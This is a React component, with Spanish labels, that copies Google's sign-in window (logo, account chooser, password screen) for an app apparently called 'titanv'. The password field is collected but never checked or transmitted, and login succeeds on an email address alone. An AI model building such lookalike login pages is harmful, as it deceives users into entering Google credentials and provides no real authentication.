import React, { useState, useEffect } from 'react';

interface CuentaItem {
  nombre: string;
  email: string;
  avatarColor: string;
}

interface VentanaGoogleLoginProps {
  isOpen: boolean;
  onClose: () => void;
  onLogin: (email: string, name: string) => Promise<void>;
}

const COLORES = ['#0b8043', '#d93025', '#1a73e8', '#f29900', '#8e24aa', '#e37400'];

export const VentanaGoogleLogin: React.FC<VentanaGoogleLoginProps> = ({
  isOpen,
  onClose,
  onLogin,
}) => {
  const [cuentas, setCuentas] = useState<CuentaItem[]>([]);
  // 'elegir_cuenta' | 'ingresar_correo' | 'ingresar_password'
  const [vista, setVista] = useState<'elegir_cuenta' | 'ingresar_correo' | 'ingresar_password'>('ingresar_correo');
  const [modoQuitar, setModoQuitar] = useState(false);

  const [emailInput, setEmailInput] = useState('');
  const [nombreInput, setNombreInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [mostrarPassword, setMostrarPassword] = useState(false);
  const [cargando, setCargando] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Cuenta activa para la pantalla de contraseña
  const [cuentaSeleccionada, setCuentaSeleccionada] = useState<{ email: string; nombre: string } | null>(null);

  useEffect(() => {
    if (!isOpen) return;
    setErrorMsg('');
    try {
      const guardadas = localStorage.getItem('titanv_google_cuentas_v2');
      if (guardadas) {
        const parsed = JSON.parse(guardadas);
        if (Array.isArray(parsed) && parsed.length > 0) {
          setCuentas(parsed);
          setVista('elegir_cuenta');
          setModoQuitar(false);
          return;
        }
      }
    } catch {
      // ignore
    }
    setVista('ingresar_correo');
  }, [isOpen]);

  if (!isOpen) return null;

  const guardarCuentaEnMemoria = (nuevoEmail: string, nuevoNombre: string) => {
    try {
      const color = COLORES[Math.floor(Math.random() * COLORES.length)];
      const item: CuentaItem = {
        email: nuevoEmail,
        nombre: nuevoNombre || nuevoEmail.split('@')[0],
        avatarColor: color,
      };
      const filtradas = cuentas.filter((c) => c.email.toLowerCase() !== nuevoEmail.toLowerCase());
      const lista = [item, ...filtradas].slice(0, 6);
      setCuentas(lista);
      localStorage.setItem('titanv_google_cuentas_v2', JSON.stringify(lista));
    } catch {
      // ignore
    }
  };

  const handleEliminarCuenta = (emailAEliminar: string) => {
    const lista = cuentas.filter((c) => c.email !== emailAEliminar);
    setCuentas(lista);
    localStorage.setItem('titanv_google_cuentas_v2', JSON.stringify(lista));
    if (lista.length === 0) {
      setModoQuitar(false);
      setVista('ingresar_correo');
    }
  };

  // Al dar siguiente en el correo
  const handleSiguienteCorreo = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');
    const correoLimpio = emailInput.trim();
    if (!correoLimpio) {
      setErrorMsg('Ingresa un correo electrónico o número de teléfono');
      return;
    }
    const nombreFinal = nombreInput.trim() || correoLimpio.split('@')[0];
    setCuentaSeleccionada({ email: correoLimpio, nombre: nombreFinal });
    setPasswordInput('');
    setVista('ingresar_password');
  };

  // Al seleccionar una cuenta de la lista
  const handleSeleccionarCuenta = (cta: CuentaItem) => {
    if (modoQuitar) {
      handleEliminarCuenta(cta.email);
      return;
    }
    setErrorMsg('');
    setCuentaSeleccionada({ email: cta.email, nombre: cta.nombre });
    setPasswordInput('');
    setVista('ingresar_password');
  };

  // Al dar siguiente en la contraseña (Iniciar Sesión final)
  const handleLoginFinal = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cuentaSeleccionada) return;
    setErrorMsg('');
    setCargando(true);

    try {
      guardarCuentaEnMemoria(cuentaSeleccionada.email, cuentaSeleccionada.nombre);
      await onLogin(cuentaSeleccionada.email, cuentaSeleccionada.nombre);
    } catch (err: any) {
      setErrorMsg(err?.message || 'Error al conectar con la base de datos.');
      setCargando(false);
    }
  };

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        zIndex: 99999,
        backgroundColor: 'rgba(0, 0, 0, 0.65)',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '16px',
        fontFamily: 'Roboto, Arial, sans-serif',
      }}
      onClick={(e) => {
        if (e.target === e.currentTarget && !cargando) onClose();
      }}
    >
      {/* Contenedor central de la ventana de Google */}
      <div style={{ width: '100%', maxWidth: '450px' }}>
        <div
          style={{
            backgroundColor: '#ffffff',
            borderRadius: '8px',
            border: '1px solid #dadce0',
            padding: '40px 40px 36px',
            boxSizing: 'border-box',
            position: 'relative',
            overflow: 'hidden',
          }}
        >
          {/* Barra de progreso animada de Google */}
          {cargando && (
            <div
              style={{
                position: 'absolute',
                top: 0,
                left: 0,
                right: 0,
                height: '4px',
                backgroundColor: '#e8f0fe',
                overflow: 'hidden',
              }}
            >
              <div
                style={{
                  height: '100%',
                  width: '50%',
                  backgroundColor: '#1a73e8',
                  animation: 'googleBarra 1.1s infinite ease-in-out',
                }}
              />
            </div>
          )}

          {/* Logo oficial de Google */}
          <div style={{ textAlign: 'center', marginBottom: '16px' }}>
            <span
              style={{
                fontFamily: "'Product Sans', Roboto, sans-serif",
                fontSize: '24px',
                fontWeight: 500,
                letterSpacing: '-0.5px',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '0.5px',
              }}
            >
              <span style={{ color: '#4285F4' }}>G</span>
              <span style={{ color: '#EA4335' }}>o</span>
              <span style={{ color: '#FBBC05' }}>o</span>
              <span style={{ color: '#4285F4' }}>g</span>
              <span style={{ color: '#34A853' }}>l</span>
              <span style={{ color: '#EA4335' }}>e</span>
            </span>
          </div>

          {/* Mensaje de error */}
          {errorMsg && (
            <div
              style={{
                color: '#d93025',
                fontSize: '12px',
                marginBottom: '14px',
                display: 'flex',
                alignItems: 'center',
                gap: '6px',
              }}
            >
              <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
              </svg>
              <span>{errorMsg}</span>
            </div>
          )}

          {/* ======================================================== */}
          {/* PANTALLA 1: ELEGIR UNA CUENTA (Exacto a la Imagen 2)     */}
          {/* ======================================================== */}
          {vista === 'elegir_cuenta' && (
            <div>
              <h1
                style={{
                  fontSize: '24px',
                  fontWeight: 400,
                  color: '#202124',
                  textAlign: 'center',
                  margin: '0 0 24px',
                }}
              >
                {modoQuitar ? 'Quitar una cuenta' : 'Elegir una cuenta'}
              </h1>

              <div style={{ borderTop: '1px solid #dadce0', margin: '0 -40px' }}>
                {cuentas.map((cta) => (
                  <div
                    key={cta.email}
                    onClick={() => handleSeleccionarCuenta(cta)}
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: '12px 40px',
                      borderBottom: '1px solid #dadce0',
                      cursor: 'pointer',
                      transition: 'background-color 0.15s',
                    }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f8fafd')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                      <div
                        style={{
                          width: '32px',
                          height: '32px',
                          borderRadius: '50%',
                          backgroundColor: cta.avatarColor || '#d93025',
                          color: '#ffffff',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          fontSize: '15px',
                          fontWeight: 500,
                        }}
                      >
                        {cta.nombre[0]?.toUpperCase() || 'U'}
                      </div>
                      <div>
                        <div style={{ fontSize: '14px', fontWeight: 500, color: '#202124' }}>
                          {cta.nombre}
                        </div>
                        <div style={{ fontSize: '12px', color: '#5f6368' }}>{cta.email}</div>
                      </div>
                    </div>

                    {modoQuitar ? (
                      <span
                        style={{
                          color: '#d93025',
                          fontSize: '18px',
                          fontWeight: 700,
                          padding: '0 8px',
                        }}
                      >
                        ⊖
                      </span>
                    ) : (
                      <div style={{ fontSize: '12px', color: '#5f6368' }}>
                        Saliste de tu cuenta
                      </div>
                    )}
                  </div>
                ))}

                {/* Usar otra cuenta */}
                {!modoQuitar && (
                  <div
                    onClick={() => {
                      setEmailInput('');
                      setNombreInput('');
                      setVista('ingresar_correo');
                    }}
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '16px',
                      padding: '14px 40px',
                      borderBottom: '1px solid #dadce0',
                      cursor: 'pointer',
                      transition: 'background-color 0.15s',
                    }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f8fafd')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                  >
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                    </svg>
                    <span style={{ fontSize: '14px', fontWeight: 500, color: '#202124' }}>
                      Usar otra cuenta
                    </span>
                  </div>
                )}

                {/* Quitar una cuenta */}
                <div
                  onClick={() => setModoQuitar(!modoQuitar)}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '16px',
                    padding: '14px 40px',
                    borderBottom: '1px solid #dadce0',
                    cursor: 'pointer',
                    transition: 'background-color 0.15s',
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f8fafd')}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                >
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
                    <path d="M15 12H9v-2h6v2zm-3-9C6.48 3 2 7.48 2 13s4.48 10 10 10 10-4.48 10-10S17.52 3 12 3zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" />
                  </svg>
                  <span style={{ fontSize: '14px', fontWeight: 500, color: modoQuitar ? '#1a73e8' : '#202124' }}>
                    {modoQuitar ? 'Listo' : 'Quitar una cuenta'}
                  </span>
                </div>
              </div>

              {/* Botón Cerrar */}
              <div style={{ marginTop: '24px', textAlign: 'right' }}>
                <button
                  type="button"
                  onClick={onClose}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#1a73e8',
                    fontSize: '14px',
                    fontWeight: 500,
                    cursor: 'pointer',
                    padding: '8px 16px',
                  }}
                >
                  Cerrar
                </button>
              </div>
            </div>
          )}

          {/* ======================================================== */}
          {/* PANTALLA 2: ACCEDER CON CORREO (Exacto a la Imagen 1)    */}
          {/* ======================================================== */}
          {vista === 'ingresar_correo' && (
            <form onSubmit={handleSiguienteCorreo}>
              <h1
                style={{
                  fontSize: '24px',
                  fontWeight: 400,
                  color: '#202124',
                  textAlign: 'center',
                  margin: '0 0 6px',
                }}
              >
                Acceder
              </h1>
              <p
                style={{
                  fontSize: '16px',
                  color: '#202124',
                  textAlign: 'center',
                  margin: '0 0 28px',
                }}
              >
                Usa tu Cuenta de Google
              </p>

              {/* Input flotante: Correo electrónico o teléfono */}
              <div style={{ position: 'relative', marginBottom: '6px' }}>
                <input
                  type="text"
                  id="googleEmailInput"
                  value={emailInput}
                  onChange={(e) => setEmailInput(e.target.value)}
                  placeholder=" "
                  autoFocus
                  required
                  style={{
                    width: '100%',
                    height: '54px',
                    padding: '16px 14px',
                    fontSize: '16px',
                    color: '#202124',
                    borderRadius: '4px',
                    border: '1px solid #1a73e8',
                    outline: 'none',
                    boxSizing: 'border-box',
                    backgroundColor: 'transparent',
                  }}
                />
                <label
                  htmlFor="googleEmailInput"
                  style={{
                    position: 'absolute',
                    left: '12px',
                    top: '-9px',
                    backgroundColor: '#ffffff',
                    padding: '0 6px',
                    fontSize: '12px',
                    color: '#1a73e8',
                    pointerEvents: 'none',
                  }}
                >
                  Correo electrónico o teléfono
                </label>
              </div>

              {/* ¿Olvidaste el correo electrónico? */}
              <div style={{ marginBottom: '28px' }}>
                <button
                  type="button"
                  onClick={() => alert('Ingresa tu correo de Gmail completo (ej: tu_nombre@gmail.com).')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#1a73e8',
                    fontSize: '14px',
                    fontWeight: 500,
                    cursor: 'pointer',
                    padding: 0,
                  }}
                >
                  ¿Olvidaste el correo electrónico?
                </button>
              </div>

              {/* Campo Nombre (opcional) */}
              <div style={{ position: 'relative', marginBottom: '28px' }}>
                <input
                  type="text"
                  id="googleNombreInput"
                  value={nombreInput}
                  onChange={(e) => setNombreInput(e.target.value)}
                  placeholder=" "
                  style={{
                    width: '100%',
                    height: '50px',
                    padding: '14px',
                    fontSize: '15px',
                    color: '#202124',
                    borderRadius: '4px',
                    border: '1px solid #dadce0',
                    outline: 'none',
                    boxSizing: 'border-box',
                  }}
                  onFocus={(e) => (e.target.style.borderColor = '#1a73e8')}
                  onBlur={(e) => (e.target.style.borderColor = '#dadce0')}
                />
                <label
                  htmlFor="googleNombreInput"
                  style={{
                    position: 'absolute',
                    left: '12px',
                    top: '-8px',
                    backgroundColor: '#ffffff',
                    padding: '0 6px',
                    fontSize: '12px',
                    color: '#5f6368',
                    pointerEvents: 'none',
                  }}
                >
                  Nombre completo (opcional)
                </label>
              </div>

              {/* Texto de aviso Google */}
              <p
                style={{
                  fontSize: '14px',
                  color: '#5f6368',
                  lineHeight: '1.4',
                  margin: '0 0 32px',
                }}
              >
                ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.{' '}
                <span style={{ color: '#1a73e8', cursor: 'pointer' }}>Más información</span>
              </p>

              {/* Botones inferiores: Crear cuenta & Siguiente */}
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                }}
              >
                {cuentas.length > 0 ? (
                  <button
                    type="button"
                    onClick={() => setVista('elegir_cuenta')}
                    style={{
                      background: 'none',
                      border: 'none',
                      color: '#1a73e8',
                      fontSize: '14px',
                      fontWeight: 500,
                      cursor: 'pointer',
                      padding: 0,
                    }}
                  >
                    Volver a cuentas
                  </button>
                ) : (
                  <button
                    type="button"
                    onClick={onClose}
                    style={{
                      background: 'none',
                      border: 'none',
                      color: '#1a73e8',
                      fontSize: '14px',
                      fontWeight: 500,
                      cursor: 'pointer',
                      padding: 0,
                    }}
                  >
                    Crear cuenta
                  </button>
                )}

                <button
                  type="submit"
                  style={{
                    backgroundColor: '#1a73e8',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: 500,
                    cursor: 'pointer',
                    boxShadow: '0 1px 2px rgba(0,0,0,0.1)',
                  }}
                >
                  Siguiente
                </button>
              </div>
            </form>
          )}

          {/* ======================================================== */}
          {/* PANTALLA 3: INGRESAR CONTRASEÑA                          */}
          {/* ======================================================== */}
          {vista === 'ingresar_password' && cuentaSeleccionada && (
            <form onSubmit={handleLoginFinal}>
              <h1
                style={{
                  fontSize: '24px',
                  fontWeight: 400,
                  color: '#202124',
                  textAlign: 'center',
                  margin: '0 0 6px',
                }}
              >
                Te damos la bienvenida
              </h1>

              {/* Chip con el correo seleccionado y botón volver */}
              <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '28px' }}>
                <div
                  onClick={() => setVista('ingresar_correo')}
                  style={{
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '4px 12px 4px 6px',
                    borderRadius: '16px',
                    border: '1px solid #dadce0',
                    cursor: 'pointer',
                    fontSize: '14px',
                    color: '#3c4043',
                  }}
                >
                  <div
                    style={{
                      width: '20px',
                      height: '20px',
                      borderRadius: '50%',
                      backgroundColor: '#1a73e8',
                      color: '#fff',
                      fontSize: '11px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                    }}
                  >
                    {cuentaSeleccionada.nombre[0]?.toUpperCase() || 'U'}
                  </div>
                  <span>{cuentaSeleccionada.email}</span>
                  <span style={{ fontSize: '11px', color: '#5f6368' }}>▼</span>
                </div>
              </div>

              {/* Input Contraseña */}
              <div style={{ position: 'relative', marginBottom: '10px' }}>
                <input
                  type={mostrarPassword ? 'text' : 'password'}
                  id="googlePasswordInput"
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  placeholder=" "
                  autoFocus
                  disabled={cargando}
                  style={{
                    width: '100%',
                    height: '54px',
                    padding: '16px 14px',
                    fontSize: '16px',
                    color: '#202124',
                    borderRadius: '4px',
                    border: '1px solid #1a73e8',
                    outline: 'none',
                    boxSizing: 'border-box',
                    backgroundColor: 'transparent',
                  }}
                />
                <label
                  htmlFor="googlePasswordInput"
                  style={{
                    position: 'absolute',
                    left: '12px',
                    top: '-9px',
                    backgroundColor: '#ffffff',
                    padding: '0 6px',
                    fontSize: '12px',
                    color: '#1a73e8',
                    pointerEvents: 'none',
                  }}
                >
                  Ingresa tu contraseña
                </label>
              </div>

              {/* Checkbox Mostrar contraseña */}
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  marginBottom: '28px',
                }}
              >
                <input
                  type="checkbox"
                  id="chkMostrarPass"
                  checked={mostrarPassword}
                  onChange={(e) => setMostrarPassword(e.target.checked)}
                  style={{ cursor: 'pointer' }}
                />
                <label
                  htmlFor="chkMostrarPass"
                  style={{ fontSize: '14px', color: '#3c4043', cursor: 'pointer' }}
                >
                  Mostrar contraseña
                </label>
              </div>

              {/* Botones inferiores */}
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                }}
              >
                <button
                  type="button"
                  onClick={() => setVista('ingresar_correo')}
                  disabled={cargando}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#1a73e8',
                    fontSize: '14px',
                    fontWeight: 500,
                    cursor: 'pointer',
                    padding: 0,
                  }}
                >
                  ¿Olvidaste la contraseña?
                </button>

                <button
                  type="submit"
                  disabled={cargando}
                  style={{
                    backgroundColor: cargando ? '#8ab4f8' : '#1a73e8',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: 500,
                    cursor: cargando ? 'not-allowed' : 'pointer',
                    boxShadow: '0 1px 2px rgba(0,0,0,0.1)',
                  }}
                >
                  {cargando ? 'Accediendo...' : 'Siguiente'}
                </button>
              </div>
            </form>
          )}
        </div>

        {/* ======================================================== */}
        {/* PIE DE PÁGINA INFERIOR (Exacto a la Imagen 2)             */}
        {/* ======================================================== */}
        <div
          style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            padding: '14px 2px 0',
            fontSize: '12px',
            color: '#5f6368',
          }}
        >
          {/* Selector de idioma */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}>
            <span>Español (Latinoamérica)</span>
            <span style={{ fontSize: '9px' }}>▼</span>
          </div>

          {/* Enlaces de ayuda */}
          <div style={{ display: 'flex', gap: '20px' }}>
            <span style={{ cursor: 'pointer' }}>Ayuda</span>
            <span style={{ cursor: 'pointer' }}>Privacidad</span>
            <span style={{ cursor: 'pointer' }}>Condiciones</span>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes googleBarra {
          0% { transform: translateX(-100%); }
          50% { transform: translateX(50%); }
          100% { transform: translateX(200%); }
        }
      `}</style>
    </div>
  );
};
